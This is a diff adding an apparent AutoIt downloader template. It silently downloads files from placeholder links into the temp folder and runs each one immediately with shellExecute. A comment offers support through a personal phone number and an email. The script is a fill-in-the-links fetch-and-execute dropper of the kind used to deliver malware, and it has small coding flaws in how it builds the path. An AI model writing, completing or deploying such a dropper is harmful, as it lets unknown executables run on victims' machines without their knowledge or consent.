@@ -1,0 +1,22 @@
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+#u get any problem check me out +255625524872 E-mail mranonymousTZ@gmail.com
+
+Local $urls = "UR DIRECT LINK 1,UR DIRECT LINK 2"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
